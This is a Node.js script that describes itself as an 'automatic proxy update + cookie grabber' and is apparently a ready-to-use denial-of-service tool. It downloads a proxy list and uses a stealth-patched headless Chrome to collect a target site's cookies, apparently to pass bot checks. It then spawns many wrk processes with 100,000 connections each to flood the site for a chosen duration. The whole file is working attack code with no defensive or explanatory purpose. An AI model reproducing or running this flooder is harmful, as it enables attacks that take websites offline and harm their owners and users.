// Automatic proxy update + cookie grabber
// made by https://t.me/semysocial


var TARGET;
if(process.argv[2] === undefined){
    console.log("Mistake! The arguments are wrong");
    console.log("Usage: node wrk.js [url] [thread] [time]");
    console.log("Example: node wrk.js https://example.com 12 86400");
    process.exit(3162);
} else {
    TARGET = process.argv[2].replace("\"", "");
    if(TARGET.includes("%RAND%")){
    }
}
var executablePath;
const os = require('os');
const osPlatform = os.platform();
if (/^win/i.test(osPlatform)) {
    executablePath = '';
}else if (/^linux/i.test(osPlatform)) {
    executablePath = '/usr/bin/chromium';
}
var COOKIES;
const {spawn} = require('child_process')
const chalk = require("chalk");
const EventEmitter = require('events');
const puppeteer = require('puppeteer-extra')
var BROWSER;
var INDEX_RAND;
if(TARGET.includes("%RAND%")){RAND = 1; BROWSER = TARGET.replace("%RAND%", ""); INDEX_RAND = TARGET.indexOf("%RAND%");}else{BROWSER = TARGET}
var THREADS = process.argv[3];
var TIME = process.argv[4];
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;
process.on('uncaughtException', function (err) { console.log(err) });
process.on('unhandledRejection', function (err) { console.log(err) });

const execSync = require('child_process').execSync;
execSync('rm -rf proxy.txt;wget "proxy api, type socks4" -O proxy.txt');
console.log('The proxies were successfully downloaded from the API.')   

async function GetCookies(){
    proxy = 'http://localhost:8089'
    String.prototype.replaceBetween = function(start, end, what) {
        return this.substring(0, start) + what + this.substring(end);	
		
    };
    console.log(chalk.yellow(`The attack was launched on ${TARGET} for ${TIME} seconds`))

    const StealthPlugin = require('puppeteer-extra-plugin-stealth')
    puppeteer.use(StealthPlugin())
    puppeteer.launch({ headless: true ,
    product: 'chrome',
 	executablePath: executablePath, args: [
         '--ignore-certificate-errors',
        '--no-sandbox',
       '--disable-gpu',
        '--disable-canvas-aa', 
       '--disable-2d-canvas-clip-aa', 
        '--disable-gl-drawing-for-tests', 
        '--disable-dev-shm-usage', 
        '--no-zygote', 
        '--use-gl=swiftshader', 
        '--enable-webgl',
        '--hide-scrollbars',
        '--mute-audio',
        '--no-first-run',
        '--disable-infobars',
        '--disable-breakpad',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage'
]}).then(async browser => {
        console.log(chalk.blue("Analyzing cookies"));
		const page = await browser.newPage();
		await page.setDefaultNavigationTimeout(5000, (err, res) => {});

//});
        try {
            await page.goto(BROWSER)
            
            await page.waitForTimeout(5000)
            await page.screenshot({ path: 'result.png', fullPage: true })
            console.log('done')
            await page.goto(BROWSER)
            COOKIES = await page.cookies()
        } catch (e) {
            console.error(e);
            COOKIES = [];
        }
        await browser.close()
        console.log(COOKIES)
        for (i=0, len=COOKIES.length, F_COOKIES=""; i<len; i++){
            F_COOKIES += COOKIES[i]['name'] + ": " + COOKIES[i]['value'] + "; "
        }
        COOKIES = `\"${F_COOKIES}\"`
        console.log(COOKIES)
        for (i=0; i<THREADS; i++){
            console.log(`The THREADS were launched: ${i+1}`)

            let spawned = spawn("./wrk", [ "-c", '100000', '-d', TIME, '-t', '3', '-H', 'Cookie: ' + COOKIES, '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', '-T', '3', TARGET], {
               stdio: 'inherit' 
            });
        }
    });
}

GetCookies();


// Automatic proxy update + cookie grabber
// made by https://t.me/semysocial